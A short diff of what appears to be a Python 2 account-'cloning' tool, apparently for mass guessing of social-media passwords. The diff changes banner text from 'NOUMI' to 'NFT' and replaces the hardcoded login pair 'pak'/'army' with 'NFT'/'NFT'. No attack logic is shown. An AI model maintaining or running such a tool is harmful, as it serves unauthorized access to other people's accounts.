@@ -100,12 +100,12 @@ jalan("\033[1;96m•◈• |_| \_|_|       |_|
 jalan("   \033[1;91m INDAIN USERZ USE ANY PROXY ")	
 jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")	
 
-jalan("   \033[1;93m Welcome to NOUMI Creations ")
+jalan("   \033[1;93m Welcome to NFT Creations ")
 
 jalan("\033[1;97m•◈•──────────•◈•\033[1;96mBlackmafia\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "pak"
-CorrectPassword = "army"
+CorrectUsername = "NFT"
+CorrectPassword = "NFT"
 
 
 loop = 'true'
@@ -325,7 +325,7 @@ def pilih_super():
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"
 
-	jalan('                    \033[1;97mnoumi start cloning Wait...')
+	jalan('                    \033[1;97mNFT start cloning Wait...')
 	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
 
 	def main(arg):
